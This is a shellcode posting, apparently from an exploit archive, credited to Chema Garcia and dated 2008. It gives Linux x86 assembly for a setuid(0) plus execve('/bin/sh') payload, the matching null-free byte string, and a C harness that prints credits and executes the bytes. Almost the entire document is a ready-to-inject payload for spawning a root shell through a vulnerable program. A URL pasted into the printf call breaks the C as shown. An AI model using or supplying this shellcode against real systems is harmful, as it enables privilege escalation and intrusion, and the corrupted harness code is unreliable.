-------------------[ASM]----------------------

global _start
section .text
_start:
;setuid(0)
xor ebx,ebx
lea eax,[ebx+17h]
cdq
int 80h
;execve("/bin/sh",0,0)
xor ecx,ecx
push ecx
push 0x68732f6e
push 0x69622f2f
lea eax,[ecx+0Bh]
mov ebx,esp
int 80h

-------------------[/ASM]----------------------

-------------------[C]----------------------

#include "stdio.h"

const char shellcode[]= "\x31\xdb"
            "\x8d\x43\x17"
            "\x99"
            "\xcd\x80"
            "\x31\xc9"
            "\x51"
            "\x68\x6e\x2f\x73\x68"
            "\x68\x2f\x2f\x62\x69"
            "\x8d\x41\x0b"
            "\x89\xe3"
            "\xcd\x80";

int main()
{
    printf < http://www.opengroup.org/onlinepubs/009695399/functions/printf.html>("\nSMALLEST SETUID & EXECVE GNU/LINUX x86 STABLE SHELLCODE"
            "WITHOUT NULLS THAT SPAWNS A SHELL"
            "\n\nCoded by Chema Garcia (aka sch3m4)"
            "\n\t + sch3m4@opensec.es"
            "\n\t + http://opensec.es"
            "\n\n[+] Date: 29/11/2008"
            "\n[+] Thanks to: vlan7"
            "\n\n[+] Shellcode Size: %d bytes\n\n",
            sizeof(shellcode)-1);

    (*(void (*)()) shellcode)();

    return 0;
}





